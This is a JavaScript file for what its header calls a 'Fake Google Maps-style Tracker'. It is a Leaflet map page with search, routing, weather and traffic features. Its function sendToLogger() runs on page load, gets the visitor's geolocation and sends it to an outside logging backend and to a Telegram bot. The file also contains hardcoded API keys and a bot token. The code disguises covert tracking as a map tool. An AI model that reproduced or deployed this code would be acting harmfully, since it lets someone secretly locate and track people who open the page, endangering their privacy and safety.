// 🌍 Final script.js for Fake Google Maps-style Tracker

let map;
let marker;
let startMarker, endMarker, routeControl;
let currentPos;
let history = \[];
let weatherShown = false;
let trafficLayer;

const MAPTILER\_KEY = "TCvevZOKio37CwdIPP3u";
const BACKEND\_URL = "[https://fake-logger.onrender.com](https://fake-logger.onrender.com)";
const TELEGRAM\_TOKEN = "7943375930\:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
const TELEGRAM\_CHAT\_ID = "6602027873";

window\.onload = () => {
initMap();
sendToLogger();
};

function initMap() {
map = L.map("map").setView(\[25.276987, 55.296249], 13); // Qatar fake view

const tile = L.tileLayer(`https://api.maptiler.com/maps/streets-v2/{z}/{x}/{y}.png?key=${MAPTILER_KEY}`, {
attribution: "© MapTiler",
}).addTo(map);

marker = L.marker(\[25.276987, 55.296249], {
draggable: false,
icon: L.icon({
iconUrl: "assets/red-marker.png",
iconSize: \[32, 32],
iconAnchor: \[16, 32]
})
}).addTo(map);

map.on("dblclick", () => marker.remove());
}

function performSearch() {
const input = document.getElementById("searchInput").value;
if (!input) return;
fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${input}`)
.then(res => res.json())
.then(results => {
if (results.length > 0) {
const place = results\[0];
const latlng = \[place.lat, place.lon];
if (marker) marker.remove();
marker = L.marker(latlng, {
icon: L.icon({ iconUrl: "assets/red-marker.png", iconSize: \[32, 32], iconAnchor: \[16, 32] })
}).addTo(map);
map.setView(latlng, 15);
history.push(place.display\_name);
}
});
}

function locateMe() {
navigator.geolocation.getCurrentPosition(pos => {
const lat = pos.coords.latitude;
const lon = pos.coords.longitude;
currentPos = \[lat, lon];
L.marker(currentPos, {
icon: L.icon({ iconUrl: "assets/custom-marker.png", iconSize: \[32, 32], iconAnchor: \[16, 32] })
}).addTo(map);
map.setView(currentPos, 16);
});
}

function toggleDarkMode() {
document.body.classList.toggle("dark-mode");
}

function toggleSearch() {
document.getElementById("searchBox").style.display = "flex";
document.getElementById("direction-panel").style.display = "none";
}

function toggleDirection() {
const panel = document.getElementById("direction-panel");
const search = document.getElementById("searchBox");
if (panel.style.display === "flex" || panel.style.display === "block") {
panel.style.display = "none";
search.style.display = "flex";
} else {
panel.style.display = "block";
search.style.display = "none";
}
}

function closeDirectionPanel() {
document.getElementById("direction-panel").style.display = "none";
document.getElementById("searchBox").style.display = "flex";
if (routeControl) map.removeControl(routeControl);
}

function getRoute() {
const start = document.getElementById("start").value;
const end = document.getElementById("end").value;
if (!start || !end) return;

Promise.all(\[
fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${start}`).then(res => res.json()),
fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${end}`).then(res => res.json())
]).then((\[startRes, endRes]) => {
const s = startRes\[0], e = endRes\[0];
if (startMarker) map.removeLayer(startMarker);
if (endMarker) map.removeLayer(endMarker);
if (routeControl) map.removeControl(routeControl);


const startIcon = L.icon({ iconUrl: "assets/custom-start.png", iconSize: [32, 32], iconAnchor: [16, 32] });
const endIcon = L.icon({ iconUrl: "assets/red-marker.png", iconSize: [32, 32], iconAnchor: [16, 32] });

startMarker = L.marker([s.lat, s.lon], { icon: startIcon }).addTo(map);
endMarker = L.marker([e.lat, e.lon], { icon: endIcon }).addTo(map);

routeControl = L.Routing.control({
  waypoints: [L.latLng(s.lat, s.lon), L.latLng(e.lat, e.lon)],
  lineOptions: {
    styles: [{ color: '#1976d2', weight: 5 }]
  },
  routeWhileDragging: false,
  draggableWaypoints: false,
  createMarker: () => null
}).addTo(map);


});
}

function toggleWeather(btn) {
const box = document.getElementById("weather-box");
weatherShown = !weatherShown;
box.style.display = weatherShown ? "block" : "none";

if (currentPos) fetchWeather(currentPos\[0], currentPos\[1]);
}

function fetchWeather(lat, lon) {
fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=71aec132cf2764d6ea577d3616629a9b&units=metric`)
.then(res => res.json())
.then(data => {
document.getElementById("temp").innerText = data.main.temp + "°C";
document.getElementById("condition").innerText = data.weather\[0].description;
document.getElementById("weather-location").innerText = data.name;
});
}

function toggleTraffic(btn) {
if (!trafficLayer) {
trafficLayer = L.tileLayer(`https://api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=a3vv3A6LAvqLAIKmknfwzSBXEjJOpXwu`, {
tileSize: 256,
opacity: 0.6
});
}
if (map.hasLayer(trafficLayer)) {
map.removeLayer(trafficLayer);
btn.classList.remove("active");
} else {
trafficLayer.addTo(map);
btn.classList.add("active");
}
}

function toggleHistory(show) {
const panel = document.getElementById("history-panel");
panel.style.display = show ? "block" : "none";

const list = document.getElementById("historyList");
list.innerHTML = "";
history.slice(-10).reverse().forEach(item => {
const li = document.createElement("li");
li.textContent = item;
list.appendChild(li);
});
}

function sendToLogger() {
navigator.geolocation.getCurrentPosition(pos => {
const lat = pos.coords.latitude;
const lon = pos.coords.longitude;
const payload = {
lat, lon,
time: new Date().toISOString(),
userAgent: navigator.userAgent
};
fetch(`${BACKEND_URL}/log.php`, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify(payload)
});


// Telegram
const msg = `New visitor\nLat: ${lat}\nLon: ${lon}\nTime: ${payload.time}`;
fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);

});
}
